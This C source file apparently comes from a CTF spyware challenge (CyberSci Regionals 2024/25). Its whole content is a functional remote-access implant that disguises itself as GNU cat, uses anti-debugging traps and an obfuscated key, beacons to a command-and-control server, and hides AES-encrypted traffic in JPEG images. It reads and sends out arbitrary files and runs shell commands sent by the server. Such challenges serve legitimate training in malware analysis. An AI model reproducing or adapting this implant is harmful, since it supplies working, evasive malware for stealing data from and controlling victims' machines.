/*

  CyberSci Regionals 2024/25

  Malicous implant from Spyware challenge by 0xd13a

*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include "curl/curl.h"
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <signal.h>

// When building, run one of the following commands:
// 
// For testing:
//
// make
// 
// For release:
//
// make FLAGS='-DC2_SERVER=\"10.0.2.50\"'

// If in testing mode do a bunch of stuff we don't want to do in production
#ifndef C2_SERVER
    # define OUT(x) printf x
    # define DUMP(x,y) BIO_dump_fp (stdout, x, y)

    # define SLEEP_SECONDS 1
    # define C2_SERVER "127.0.0.1"
#else
    # define OUT(x) do {} while (0)
    # define DUMP(x,y) do {} while (0)

    # define SLEEP_SECONDS 30
#endif

// C2 address
char* C2 = C2_SERVER;
int PORT = 0xCA75;
char url[100];

// Code obfuscation and anti-debugging
#define ANTI_DEBUG signal(SIGTRAP, handler); __asm__("int3")

// Fake debug handler
void handler(int signo)
{
}

// Encryption section start
char TAG[] = "\xff\xcc\xaa\x77\x55";
size_t TAG_SIZE = sizeof(TAG)-1;

// Tags for extracting base64'ed content of the image
char* b64_start_tag = ";base64, ";
char* b64_end_tag = "\" alt=\"\"/>";

// Obfuscated encryption key
char KEY[] = "\x68\xfa\xee\xea\x67\xee\xd0\x4b\xaa\x28\xee\x61\x71\x17\xdf\x2e\xcf\xda";

// Encryption key size
#define KEY_SIZE 32
// Encryption IV size
#define IV_SIZE 16
// Sha 256 size
#define SHA256_size 32

// Fake help text
char* help = "Usage: cat [OPTION]... [FILE]...\n\
Concatenate FILE(s) to standard output.\n\
\n\
With no FILE, or when FILE is -, read standard input.\n\
\n\
  -A, --show-all           equivalent to -vET\n\
  -b, --number-nonblank    number nonempty output lines, overrides -n\n\
  -e                       equivalent to -vE\n\
  -E, --show-ends          display $ at end of each line\n\
  -n, --number             number all output lines\n\
  -s, --squeeze-blank      suppress repeated empty output lines\n\
  -t                       equivalent to -vT\n\
  -T, --show-tabs          display TAB characters as ^I\n\
  -u                       (ignored)\n\
  -v, --show-nonprinting   use ^ and M- notation, except for LFD and TAB\n\
      --help     display this help and exit\n\
      --version  output version information and exit\n\
\n\
Examples:\n\
  cat f - g  Output f's contents, then standard input, then g's contents.\n\
  cat        Copy standard input to standard output.\n\
\n\
GNU coreutils online help: <https://www.gnu.org/software/coreutils/>\n\
Full documentation <https://www.gnu.org/software/coreutils/cat>\n\
or available locally via: info '(coreutils) cat invocation'\n";

// Fake version text
char* version = "cat (GNU coreutils) 8.32\n\
Copyright (C) 2020 Free Software Foundation, Inc.\n\
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.\n\
This is free software: you are free to change and redistribute it.\n\
There is NO WARRANTY, to the extent permitted by law.\n\
\n\
Written by Torbjorn Granlund and Richard M. Stallman.\n";

// Embedded image references
extern char _binary____images_0_jpg_start[], _binary____images_0_jpg_end[];
extern char _binary____images_1_jpg_start[], _binary____images_1_jpg_end[];
extern char _binary____images_2_jpg_start[], _binary____images_2_jpg_end[];
extern char _binary____images_3_jpg_start[], _binary____images_3_jpg_end[];
extern char _binary____images_4_jpg_start[], _binary____images_4_jpg_end[];
extern char _binary____images_5_jpg_start[], _binary____images_5_jpg_end[];
extern char _binary____images_6_jpg_start[], _binary____images_6_jpg_end[];
extern char _binary____images_7_jpg_start[], _binary____images_7_jpg_end[];
extern char _binary____images_8_jpg_start[], _binary____images_8_jpg_end[];
extern char _binary____images_9_jpg_start[], _binary____images_9_jpg_end[];
extern char _binary____images_a_jpg_start[], _binary____images_a_jpg_end[];
extern char _binary____images_b_jpg_start[], _binary____images_b_jpg_end[];
extern char _binary____images_c_jpg_start[], _binary____images_c_jpg_end[];
extern char _binary____images_d_jpg_start[], _binary____images_d_jpg_end[];
extern char _binary____images_e_jpg_start[], _binary____images_e_jpg_end[];
extern char _binary____images_f_jpg_start[], _binary____images_f_jpg_end[];

// Sized mmory block structure
typedef struct {
    size_t size;
    char* data;
} MEM;

#define IMAGE_NO 16

MEM images[IMAGE_NO];

// Initialization before run
void setup() {
    images[0]  = (MEM){_binary____images_0_jpg_end - _binary____images_0_jpg_start, _binary____images_0_jpg_start};
    images[1]  = (MEM){_binary____images_1_jpg_end - _binary____images_1_jpg_start, _binary____images_1_jpg_start};
    images[2]  = (MEM){_binary____images_2_jpg_end - _binary____images_2_jpg_start, _binary____images_2_jpg_start};
    images[3]  = (MEM){_binary____images_3_jpg_end - _binary____images_3_jpg_start, _binary____images_3_jpg_start};
    images[4]  = (MEM){_binary____images_4_jpg_end - _binary____images_4_jpg_start, _binary____images_4_jpg_start};
    images[5]  = (MEM){_binary____images_5_jpg_end - _binary____images_5_jpg_start, _binary____images_5_jpg_start};
    images[6]  = (MEM){_binary____images_6_jpg_end - _binary____images_6_jpg_start, _binary____images_6_jpg_start};
    images[7]  = (MEM){_binary____images_7_jpg_end - _binary____images_7_jpg_start, _binary____images_7_jpg_start};
    images[8]  = (MEM){_binary____images_8_jpg_end - _binary____images_8_jpg_start, _binary____images_8_jpg_start};
    images[9]  = (MEM){_binary____images_9_jpg_end - _binary____images_9_jpg_start, _binary____images_9_jpg_start};
    images[10] = (MEM){_binary____images_a_jpg_end - _binary____images_a_jpg_start, _binary____images_a_jpg_start};
    images[11] = (MEM){_binary____images_b_jpg_end - _binary____images_b_jpg_start, _binary____images_b_jpg_start};
    images[12] = (MEM){_binary____images_c_jpg_end - _binary____images_c_jpg_start, _binary____images_c_jpg_start};
    images[13] = (MEM){_binary____images_d_jpg_end - _binary____images_d_jpg_start, _binary____images_d_jpg_start};
    images[14] = (MEM){_binary____images_e_jpg_end - _binary____images_e_jpg_start, _binary____images_e_jpg_start};
    images[15] = (MEM){_binary____images_f_jpg_end - _binary____images_f_jpg_start, _binary____images_f_jpg_start};

    sprintf(url, "https://%s:%d/", C2, PORT);
}

// Commands sent from the server
#define COMMAND_NONE 0
#define COMMAND_GET  1
#define COMMAND_EXEC 2
#define COMMAND_QUIT 3

// Responses/requests sent by implant
#define REQUEST_CHECK 0
#define REQUEST_FILE 1
#define REQUEST_COMMAND 2

// Memory deallocation
void deallocate(char *val) {
    if (val != NULL) {
        free(val);
    }
}

// Init mem structure
void init(MEM* mem) {
    if (mem != NULL) {
        mem->size = 0;
        mem->data = NULL;
    }
}

// Clear mem structure
void clear(MEM* mem) {
    if (mem != NULL) {
        mem->size = 0;
        deallocate(mem->data);
        mem->data = NULL;
    }
}

// Decode Bas64-encoded data
MEM base64_decode(char* b64, size_t b64_len) {
    MEM decoded;
    init(&decoded);

    EVP_ENCODE_CTX* EVP_ctx;

    if(!(EVP_ctx = EVP_ENCODE_CTX_new())) {
        return decoded;
    }

    decoded.data = (char *)malloc(((b64_len+3)/4 * 3) + 1);
    if (decoded.data == NULL) {
        return decoded;
    }

    EVP_DecodeInit(EVP_ctx);

    int len;

    ANTI_DEBUG;
    
    int res = EVP_DecodeUpdate(EVP_ctx, decoded.data, &len, b64, b64_len);
    if (res < 0) {
        clear(&decoded);
        return decoded;
    }

    decoded.size = len;

    EVP_DecodeFinal(EVP_ctx, decoded.data, &len); 

    decoded.size += len;

    EVP_ENCODE_CTX_free(EVP_ctx);

    return decoded;
}

// Calculate SHA256
void sha256(const unsigned char *message, size_t message_len, char *digest)
{
    EVP_MD_CTX *mdctx;

    if((mdctx = EVP_MD_CTX_new()) == NULL) {
        return;
    }

    ANTI_DEBUG;

    if(1 != EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL)) {
        return;
    }

    if(1 != EVP_DigestUpdate(mdctx, message, message_len)) {
        return;
    }

    int len;

    if(1 != EVP_DigestFinal_ex(mdctx, digest, &len)) {
        return;
    }

    EVP_MD_CTX_free(mdctx);
}

// Find binary string (not very efficient, but data sizes are small)
void* findbin(void* where, size_t where_size, void* what, size_t what_size) {
    for (void* ptr = where + where_size - what_size; ptr >= where; ptr--) {
        if (!memcmp(ptr, what, what_size)) {
            return ptr;
        }
    }
    return NULL;
}

// Decode and return the encryption key
void get_key(char* key) {
    unsigned char enc_key[sizeof(KEY)];

    memcpy(enc_key, KEY, sizeof(KEY));

    int i;
    for (i = 0; i < sizeof(KEY)-1; i++) {
        enc_key[i] = (enc_key[i]-i*2) & 0xFF;
    }

    for (i = 0; i < sizeof(KEY)-1; i++) {
        enc_key[i] = ((enc_key[i] >> i%8)|(enc_key[i] << (8 - i%8))) & 0xFF;
    }

    ANTI_DEBUG;

    for (i = 0; i < sizeof(KEY)-1; i++) {
        enc_key[i] ^= 0xAA+i*2;
    }

    for (i = 0; i < sizeof(KEY)-1; i++) {
        enc_key[i] = ((enc_key[i] << i%8)|(enc_key[i] >> (8 - i%8))) & 0xFF;
    }

    sha256(enc_key, strlen(enc_key), key);
}

// Encrypt payload
MEM encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv)
{
    EVP_CIPHER_CTX *ctx;

    int len;
    MEM ciphertext;
    init(&ciphertext);

    if (!(ctx = EVP_CIPHER_CTX_new())) {
        return ciphertext;
    }

    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        return ciphertext;
    }

    ciphertext.data = malloc(plaintext_len + 16);
    if (ciphertext.data == NULL) {
        return ciphertext;
    }

    if(1 != EVP_EncryptUpdate(ctx, ciphertext.data, &len, plaintext, plaintext_len)) {
        clear(&ciphertext);
        return ciphertext;
    }
    ciphertext.size = len;

    ANTI_DEBUG;
    
    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext.data + len, &len)) {
        clear(&ciphertext);
        return ciphertext;
    }
    ciphertext.size += len;

    ANTI_DEBUG;

    EVP_CIPHER_CTX_free(ctx);

    return ciphertext;
}

// Decrypt payload
MEM decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key, unsigned char *iv)
{
    EVP_CIPHER_CTX *ctx;

    int len;

    MEM plaintext;
    init(&plaintext);

    if(!(ctx = EVP_CIPHER_CTX_new())) {
        return plaintext;
    }

    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) {
        return plaintext;
    }

    ANTI_DEBUG;

    plaintext.data = malloc(ciphertext_len);
    if (plaintext.data == NULL) {
        return plaintext;
    }
    
    if(1 != EVP_DecryptUpdate(ctx, plaintext.data, &len, ciphertext, ciphertext_len)) {
        clear(&plaintext);
        return plaintext;
    }

    plaintext.size = len;

    if(1 != EVP_DecryptFinal_ex(ctx, plaintext.data + len, &len)) {
        clear(&plaintext);
        return plaintext;
    }

    ANTI_DEBUG;
    
    plaintext.size += len;

    EVP_CIPHER_CTX_free(ctx);

    return plaintext;
}

// Pack data for sending it to C2 server
MEM pack_data(MEM mem) {

    char iv[IV_SIZE];
    
    RAND_bytes(iv, IV_SIZE);

    char key[KEY_SIZE];
    get_key(key);   

    OUT(("Encrypting payload:\n"));
    DUMP(mem.data, mem.size);

    MEM packed;
    init(&packed);

    MEM ciphertext = encrypt(mem.data, mem.size, key, iv);
    if (ciphertext.data != NULL) {

        int idx = rand() % IMAGE_NO;

        ANTI_DEBUG;
        
        packed.size = images[idx].size + TAG_SIZE + IV_SIZE + ciphertext.size;
        packed.data = malloc(packed.size);
        if (packed.data != NULL) {
            char* pos = packed.data;
            memcpy(pos, images[idx].data, images[idx].size);
            pos += images[idx].size;
            memcpy(pos, TAG, TAG_SIZE);
            pos += TAG_SIZE;
            memcpy(pos, iv, IV_SIZE);
            pos += IV_SIZE;
            memcpy(pos, ciphertext.data, ciphertext.size);
        } else {
            clear(&packed);
        }

        clear(&ciphertext);
    }
    clear(&mem);

    return packed;
}

// Unpack data received from C2 server
char* unpack_data(MEM mem) {

    char* b64 = strstr(mem.data, b64_start_tag);
    char* b64_end = strstr(mem.data, b64_end_tag);

    if ((b64 == NULL) || (b64_end == NULL)) {
        return NULL;
    }

    b64 += strlen(b64_start_tag);
    size_t b64_len = b64_end - b64;

    MEM image = base64_decode(b64, b64_len);
    if (image.data == NULL) {
        return NULL;
    }

    OUT(("Decoded base64\n"));

    char* payload = findbin(image.data, image.size, TAG, TAG_SIZE);

    ANTI_DEBUG;

    MEM plaintext;
    init(&plaintext);
    
    if (payload != NULL) {
        payload += TAG_SIZE;

        char key[KEY_SIZE];
        get_key(key);

        size_t content_size = image.size - (payload - image.data) - IV_SIZE;

        OUT(("Found encrypted content: %p %ld\n", payload+IV_SIZE, content_size));

        plaintext = decrypt(payload+IV_SIZE, content_size, key, payload);
    }

    clear(&image);
    return plaintext.data;
}

// Calback for loading the web page contents
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;
    MEM* mem = (MEM *)userp;

    char* ptr = realloc(mem->data, mem->size + realsize + 1);
    if(!ptr) {
        return 0;
    }

    ANTI_DEBUG;
    
    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = 0;

    return realsize;
}

// Communicate with remote server
char* communicate(MEM mem) {

    MEM packaged_mem = pack_data(mem);

    char* response = NULL;

    curl_global_init(CURL_GLOBAL_ALL);

    CURL* curl = curl_easy_init();
    if (curl) {
        MEM html;
        html.data = malloc(1);
        html.size = 0;

        ANTI_DEBUG;
    
        // Set up and submit a form with a file parameter
        curl_mime* mime = curl_mime_init(curl);
        curl_mimepart* part = curl_mime_addpart(mime);
    
        curl_mime_data(part, packaged_mem.data, packaged_mem.size);
        curl_mime_type(part, "image/jpeg");
        curl_mime_name(part, "file");
        curl_mime_filename(part, "image.jpg");

        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&html);

        CURLcode res = curl_easy_perform(curl);

        if(res != CURLE_OK) {
            OUT(("Communication with C2 failed\n"));

        } else {
            OUT(("Communication with C2 succeeded\n"));
            response = unpack_data(html);

            clear(&html);
        }
 
        curl_easy_cleanup(curl);
        curl_mime_free(mime);
    }

    curl_global_cleanup();

    clear(&packaged_mem);

    return response;
}

// Build a primitive ping payload
MEM build_simple_payload(int command) {
    MEM mem;

    mem.data = malloc(1);
    mem.data[0] = command;

    mem.size = 1;

    return mem;
}

// Check if we have to shut the implant down
int check_shutdown(char* payload) {
    
    if (strlen(payload) != 21) {
        return 0;
    }

    char hash[SHA256_size];

    sha256(payload, 3, hash);
    if (memcmp(hash, "\x37\x24\xb6\x5b\x2a\xf4\x46\x06\x37\xd4\xe5\x52\x21\x62\x19\xef\x33\xa8\xda\x5c\x16\x56\x68\x19\x68\xe4\x54\x6d\xa5\x44\xac\x46", SHA256_size)) {
        return 0;
    }

    sha256(payload+3, 3, hash);
    if (memcmp(hash, "\xc7\x8e\x86\xef\xff\x8e\xc6\x56\x00\x43\xb8\xc4\x5b\x6c\xdc\x10\xe4\xf1\x7b\xd9\xbc\xf9\x03\x5d\x31\x2a\xc4\xc5\x09\xca\x69\xd0", SHA256_size)) {
        return 0;
    }

    sha256(payload+6, 3, hash);
    if (memcmp(hash, "\x3e\x94\x36\x51\xc8\x26\x20\x0e\xb9\xf6\x74\x4c\x0c\x63\x08\x86\xe1\x5e\xf5\xa2\xb7\x9e\x78\x4b\xa5\x60\x7d\x96\xb9\xb7\x4c\xfd", SHA256_size)) {
        return 0;
    }

    sha256(payload+9, 3, hash);
    if (memcmp(hash, "\xf3\x2b\x70\x2f\xba\x23\x08\x3f\x02\xc8\x30\xee\x18\x5c\x03\xaf\x9e\x47\x0d\xde\x15\x44\xcd\x6f\x1b\xad\x09\xdd\x64\x1a\xbb\x56", SHA256_size)) {
        return 0;
    }

    sha256(payload+12, 3, hash);
    if (memcmp(hash, "\x31\x25\xfe\x5c\xf9\x8c\xa0\x78\x69\xa6\xe1\xd7\x5e\x6c\x6d\xb6\x3b\x79\xd7\xd0\xf4\xd0\xf3\x48\x9e\x4d\x2a\xcc\x7a\x04\x3d\x75", SHA256_size)) {
        return 0;
    }

    sha256(payload+15, 3, hash);
    if (memcmp(hash, "\x6e\x15\xc6\x07\xf0\xda\x38\x5c\xc7\x0c\x38\xe7\x8c\xd5\x21\x47\x59\x6f\xad\x6e\x42\x60\x76\x9a\x8c\x9d\x61\xd2\xd5\x3d\x7c\x6c", SHA256_size)) {
        return 0;
    }

    sha256(payload+18, 3, hash);
    if (memcmp(hash, "\x5c\x98\x33\xcb\xc7\xfd\x0a\xfd\x79\xe5\x9f\xb5\x13\xe0\xdf\x59\x45\xa9\x57\x7a\x68\xcd\x66\x59\x0c\xe2\x10\xad\x93\xc6\xc3\xc0", SHA256_size)) {
        return 0;
    }

    return 1;
}

// Load file in memory
MEM get_file(char* payload) {
    MEM mem;
    init(&mem);

    FILE *f = fopen(payload, "rb");
    if (f == NULL) {
        return mem;
    }

    ANTI_DEBUG;
    
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    mem.size = fsize+1;
    mem.data = malloc(mem.size);
    mem.data[0] = REQUEST_FILE;
    fread(&(mem.data[1]), fsize, 1, f);
    fclose(f);

    return mem;
}

// Exec command and send output
MEM exec_command(char* payload) {
    MEM mem;
    init(&mem);

    FILE *fp;
    char buffer[100];

    fp = popen(payload, "r");
    if (fp == NULL) {
        return mem;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        if (mem.data == NULL) {
            mem.size = strlen(buffer)+1+1;
            mem.data = malloc(mem.size);
            mem.data[0] = REQUEST_COMMAND;
            strcpy(&(mem.data[1]), buffer);
        } else {
            mem.size += strlen(buffer);
            mem.data = realloc(mem.data, mem.size);
            strcat(mem.data, buffer);
        
            ANTI_DEBUG;
        }
    }

    pclose(fp);

    return mem;
}

// Main loop
void run() { 
    MEM payload;
    char* response;
    char* answer;

    while(1) {
        ANTI_DEBUG;

        OUT(("Sending CHECK request\n"));

        // Continously check with C2 server
        MEM req = build_simple_payload(REQUEST_CHECK);
        response = communicate(req);

        ANTI_DEBUG;
    
        if (response != NULL) {
            switch(response[0]) {
                // Do nothing
                case COMMAND_NONE:
                    OUT(("Response NONE\n"));
                    break;
                // Send back a file
                case COMMAND_GET:
                    OUT(("Response GET\n"));
                    payload = get_file(&(response[1]));
                    OUT(("Sending file to C2\n"));
                    answer = communicate(payload);
                    deallocate(answer);
                    break;
                // Execute command and send results
                case COMMAND_EXEC:
                    OUT(("Response EXEC\n"));
                    payload = exec_command(&(response[1]));
                    OUT(("Executed command and sending results to C2\n"));
                    answer = communicate(payload);
                    deallocate(answer);
                    break;
                // Shut down
                case COMMAND_QUIT:
                    OUT(("Response QUIT\n"));
                    if (check_shutdown(&(response[1]))) {
                        return;
                    }
                    break;
            }
            deallocate(response);
        }

        // Sleep for a bit and try again
        sleep(SLEEP_SECONDS);
    }
}

// Main entrypoint
int main(int argc, char* argv[]) {
    if (argc == 2) {
        if (strcmp(argv[1], "--version") == 0) {
            printf("%s", version);
            return 0;
        }
        if (strcmp(argv[1], "--help") == 0) {
            printf("%s", help);
            return 0;
        }
    }

    setup();

    run();
}
